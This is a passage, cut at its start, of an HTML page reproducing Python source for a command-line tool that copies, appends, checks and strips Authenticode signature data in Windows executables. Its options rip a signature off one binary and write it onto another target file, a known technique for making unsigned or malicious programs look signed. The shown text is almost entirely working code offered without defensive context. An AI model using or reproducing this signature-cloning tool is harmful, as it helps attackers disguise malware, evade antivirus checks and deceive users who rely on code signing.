/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary.seek(-flItms[&#39;CertSize&#39;],&nbsp;io.SEEK_END)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary.truncate()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary.seek(flItms[&#39;CertTableLOC&#39;],&nbsp;0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;binary.write(b&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;)<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Signature&nbsp;removed.&nbsp;\nFIN.&quot;)<br />&nbsp;<br />&nbsp;<br />def&nbsp;signfile(exe,&nbsp;sigfile,&nbsp;output):<br />&nbsp;&nbsp;&nbsp;&nbsp;flItms&nbsp;=&nbsp;gather_file_info_win(exe)<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;cert&nbsp;=&nbsp;open(sigfile,&nbsp;&#39;rb&#39;).read()<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;output:&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output&nbsp;=&nbsp;output&nbsp;=&nbsp;str(exe)&nbsp;+&nbsp;&quot;_signed&quot;<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;shutil.copy2(exe,&nbsp;output)<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Output&nbsp;file:&nbsp;{0}&quot;.format(output))<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(exe,&nbsp;&#39;rb&#39;)&nbsp;as&nbsp;g:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(output,&nbsp;&#39;wb&#39;)&nbsp;as&nbsp;f:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(g.read())<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.seek(0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.seek(flItms[&#39;CertTableLOC&#39;],&nbsp;0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(struct.pack(&quot;&lt;I&quot;,&nbsp;len(open(exe,&nbsp;&#39;rb&#39;).read())))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(struct.pack(&quot;&lt;I&quot;,&nbsp;len(cert)))<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.seek(0,&nbsp;io.SEEK_END)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(cert)<br />&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Signature&nbsp;appended.&nbsp;\nFIN.&quot;)<br />&nbsp;<br />&nbsp;<br />if&nbsp;__name__&nbsp;==&nbsp;&quot;__main__&quot;:<br />&nbsp;&nbsp;&nbsp;&nbsp;usage&nbsp;=&nbsp;&#39;usage:&nbsp;%prog&nbsp;[options]&#39;<br />&nbsp;&nbsp;&nbsp;&nbsp;parser&nbsp;=&nbsp;OptionParser()<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(&quot;-i&quot;,&nbsp;&quot;--file&quot;,&nbsp;dest=&quot;inputfile&quot;,&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&quot;input&nbsp;file&quot;,&nbsp;metavar=&quot;FILE&quot;)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(&#39;-r&#39;,&nbsp;&#39;--rip&#39;,&nbsp;dest=&#39;ripsig&#39;,&nbsp;action=&#39;store_true&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&#39;rip&nbsp;signature&nbsp;off&nbsp;inputfile&#39;)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(&#39;-a&#39;,&nbsp;&#39;--add&#39;,&nbsp;dest=&#39;addsig&#39;,&nbsp;action=&#39;store_true&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&#39;add&nbsp;signautre&nbsp;to&nbsp;targetfile&#39;)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(&#39;-o&#39;,&nbsp;&#39;--output&#39;,&nbsp;dest=&#39;outputfile&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&#39;output&nbsp;file&#39;)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(&#39;-s&#39;,&nbsp;&#39;--sig&#39;,&nbsp;dest=&#39;sigfile&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&#39;binary&nbsp;signature&nbsp;from&nbsp;disk&#39;)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(&#39;-t&#39;,&nbsp;&#39;--target&#39;,&nbsp;dest=&#39;targetfile&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&#39;file&nbsp;to&nbsp;append&nbsp;signature&nbsp;to&#39;)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(&#39;-c&#39;,&nbsp;&#39;--checksig&#39;,&nbsp;dest=&#39;checksig&#39;,&nbsp;action=&#39;store_true&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&#39;file&nbsp;to&nbsp;check&nbsp;if&nbsp;signed;&nbsp;does&nbsp;not&nbsp;verify&nbsp;signature&#39;)<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.add_option(&#39;-T&#39;,&nbsp;&#39;--truncate&#39;,&nbsp;dest=&quot;truncate&quot;,&nbsp;action=&#39;store_true&#39;,<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;help=&#39;truncate&nbsp;signature&nbsp;(i.e.&nbsp;remove&nbsp;sig)&#39;)<br />&nbsp;&nbsp;&nbsp;&nbsp;(options,&nbsp;args)&nbsp;=&nbsp;parser.parse_args()<br />&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;rip&nbsp;signature<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;inputfile&nbsp;and&nbsp;rip&nbsp;to&nbsp;outputfile<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;options.inputfile&nbsp;and&nbsp;options.ripsig:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Ripping&nbsp;signature&nbsp;to&nbsp;file!&quot;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outputCert(options.inputfile,&nbsp;options.outputfile)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;copy&nbsp;from&nbsp;one&nbsp;to&nbsp;another<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;inputfile&nbsp;and&nbsp;rip&nbsp;to&nbsp;targetfile&nbsp;to&nbsp;outputfile&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;options.inputfile&nbsp;and&nbsp;options.targetfile:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cert&nbsp;=&nbsp;copyCert(options.inputfile)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;writeCert(cert,&nbsp;options.targetfile,&nbsp;options.outputfile)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;check&nbsp;signature<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;inputfile&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;options.inputfile&nbsp;and&nbsp;options.checksig:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;check_sig(options.inputfile)&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;add&nbsp;sig&nbsp;to&nbsp;target&nbsp;file<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;options.targetfile&nbsp;and&nbsp;options.sigfile:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;signfile(options.targetfile,&nbsp;options.sigfile,&nbsp;options.outputfile)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;truncate<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;options.inputfile&nbsp;and&nbsp;options.truncate:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;truncate(options.inputfile,&nbsp;options.outputfile)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.print_help()<br />&nbsp;&nbsp;&nbsp;&nbsp;parser.error(&quot;You&nbsp;must&nbsp;do&nbsp;something!&quot;)</div></div><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>